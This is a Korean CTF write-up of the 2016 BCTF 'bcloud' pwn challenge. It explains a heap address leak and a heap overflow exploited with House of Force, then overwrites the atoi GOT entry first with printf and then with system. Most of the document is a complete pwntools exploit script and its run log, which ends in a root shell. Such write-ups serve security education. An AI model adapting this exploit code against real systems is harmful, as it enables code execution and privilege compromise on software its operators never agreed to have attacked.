# [2016_BCTF] \[PWN] bcloud

### 환경

```
[*] '/root/labs/ctf/2016_bctf/bcloud/bcloud'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```



### 문제 이해

```
root@inj3ct:~/labs/ctf/2016_bctf/bcloud# ./bcloud 
Input your name:
111 
Hey 111! Welcome to BCTF CLOUD NOTE MANAGE SYSTEM!
Now let's set synchronization options.
Org:
2222
Host:
3333
OKay! Enjoy:)
1.New note
2.Show note
3.Edit note
4.Delete note
5.Syn
6.Quit
option--->>
```

name, Org, Host를 입력받은 후 note를 쓰고 편집하고 삭제할 수 있는 프로그램입니다.



### 취약점1 - Memory Leak

```c
int sub_80487A1()
{
  char s; // [sp+1Ch] [bp-5Ch]@1
  char *v2; // [sp+5Ch] [bp-1Ch]@1
  int v3; // [sp+6Ch] [bp-Ch]@1

  v3 = *MK_FP(__GS__, 20);
  memset(&s, 0, 0x50u);
  puts("Input your name:");
  sub_804868D(&s, 64, 10);
  v2 = (char *)malloc(0x40u);
  dword_804B0CC = (int)v2;
  strcpy(v2, &s);
  sub_8048779(v2);
  return *MK_FP(__GS__, 20) ^ v3;
}
```

name을 입력하는 부분에서 memory leak이 발생합니다.



```
> x/20x 0x804c000
0x804c000:	0x00000000	0x00000049	0x61616161	0x61616161
0x804c010:	0x61616161	0x61616161	0x61616161	0x61616161
0x804c020:	0x61616161	0x61616161	0x61616161	0x61616161
0x804c030:	0x61616161	0x61616161	0x61616161	0x61616161
0x804c040:	0x61616161	0x61616161	0x0804c008	0x00020f00
```

64바이트만큼 입력하면 heap 주소를 leak할 수 있습니다.



### 취약점2 - Heap Overflow

```c
int sub_804884E()
{
  char s; // [sp+1Ch] [bp-9Ch]@1
  char *v2; // [sp+5Ch] [bp-5Ch]@1
  int v3; // [sp+60h] [bp-58h]@1
  char *v4; // [sp+A4h] [bp-14h]@1
  int v5; // [sp+ACh] [bp-Ch]@1

  v5 = *MK_FP(__GS__, 20);
  memset(&s, 0, 0x90u);
  puts("Org:");
  sub_804868D(&s, 64, 10);
  puts("Host:");
  sub_804868D(&v3, 64, 10);
  v4 = (char *)malloc(0x40u);
  v2 = (char *)malloc(0x40u);
  dword_804B0C8 = (int)v2;
  dword_804B148 = (int)v4;
  strcpy(v4, (const char *)&v3);
  strcpy(v2, &s);
  puts("OKay! Enjoy:)");
  return *MK_FP(__GS__, 20) ^ v5;
}
```

Org, Host를 입력받는 부분에서 Heap Overflow가 발생합니다. 이를 통해 top chunk를 덮어서 House of Force 공격이 가능합니다.



### Exploit

문제는 HoF 공격을 통해 어떤 got를 어떤 주소로 바꿀 것이냐 하는 것입니다. 우선 shell을 따려면 libc base를 알아야 합니다.

```c
int sub_8048709()
{
  int result; // eax@1
  int v1; // edx@1
  char nptr; // [sp+18h] [bp-20h]@1
  int v3; // [sp+2Ch] [bp-Ch]@1

  v3 = *MK_FP(__GS__, 20);
  sub_804868D(&nptr, 16, 10);
  result = atoi(&nptr);
  v1 = *MK_FP(__GS__, 20) ^ v3;
  return result;
}
```

atoi 함수를 보면 인자로 우리가 입력한 값이 들어갑니다. atoi got를 printf로 덮음으로써 Format String Bug 취약점을 발생시킬 수 있습니다. FSB를 통해서 libc를 leak할 수 있습니다.

다만 입력 바이트에 제한이 있기 때문에 FSB로 EIP를 조작하긴 힘듭니다. 따라서 프로그램의 3번 메뉴인 Edit 기능을 통해 EIP를 system으로 바꿔야 합니다.



```python
from pwn import *

e = ELF("./bcloud")
printf_plt = e.plt['printf']
printf_got = e.got['printf']
puts_plt = e.plt['puts']
puts_got = e.got['puts']
exit_got = e.got['exit']
atoi_got = e.got['atoi']

l = ELF("/lib/i386-linux-gnu/libc.so.6")
system_got = l.symbols['system']

p = process("./bcloud")
print p.recv()
p.send("a"*0x40)
p.recvuntil("a"*0x40)
heap_addr = u32(p.recv(4))	# leak
print p.recv()
log.info("*** leaked heap address : {} ***".format(hex(heap_addr)))

p.send("a"*0x40)
p.sendline("\xff"*4)		# overwrite top chunk
top_addr = heap_addr+0xd8
log.info("*** top chunk address : {} ***".format(hex(top_addr)))

target_addr = atoi_got
length = target_addr - top_addr - 0x8
log.info("*** target address : {} ***".format(hex(target_addr)))

print p.recv()
p.sendline("1")
print p.recv()
p.sendline(str(length-4))
print p.recv()
p.sendline("a")			# set target

print p.recv()
p.sendline("1")
print p.recv()
p.sendline(str(0x30-4))
print p.recv()
p.sendline("a"*4+p32(printf_plt))	# make fsb
print p.recv()

p.sendline("%3$x")
leaked = int(p.recv(8),16)	# libc leak
print hex(leaked)
libcbase = leaked - (0xf7e5a696-0xf7e11000)
log.info("*** libc base : {} ***".format(hex(libcbase)))
print p.recv()

p.sendline("a"*3)		# edit
print p.recv()
p.sendline("1")
print p.recv()
p.sendline("a"*4 + p32(libcbase+system_got))
print p.recv()
p.send("/bin/sh\x00")
p.interactive()
```



### 결과

```
root@inj3ct:~/labs/ctf/2016_bctf/bcloud# python ex.py
[*] '/root/labs/ctf/2016_bctf/bcloud/bcloud'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] '/lib/i386-linux-gnu/libc.so.6'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './bcloud': pid 8905
Input your name:

! Welcome to BCTF CLOUD NOTE MANAGE SYSTEM!
Now let's set synchronization options.
Org:

[*] *** leaked heap address : 0x94a3008 ***
[*] *** top chunk address : 0x94a30e0 ***
[*] *** target address : 0x804b03c ***
Host:
OKay! Enjoy:)
1.New note
2.Show note
3.Edit note
4.Delete note
5.Syn
6.Quit
option--->>

Input the length of the note content:

Input the content:
Create success, the id is 0
1.New note
2.Show note
3.Edit note
4.Delete note
5.Syn
6.Quit
option--->>

Invalid option.
1.New note
2.Show note
3.Edit note
4.Delete note
5.Syn
6.Quit
option--->>

Input the length of the note content:

Input the content:

Create success, the id is 1
1.New note
2.Show note
3.Edit note
4.Delete note
5.Syn
6.Quit
option--->>

0xf7653696
[*] *** libc base : 0xf760a000 ***
Invalid option.
1.New note
2.Show note
3.Edit note
4.Delete note
5.Syn
6.Quit
option--->>

aaaInput the id:

1Input the new content:

Edit success.
1.New note
2.Show note
3.Edit note
4.Delete note
5.Syn
6.Quit
option--->>

[*] Switching to interactive mode
$ id
$ id
uid=0(root) gid=0(root) groups=0(root)
```

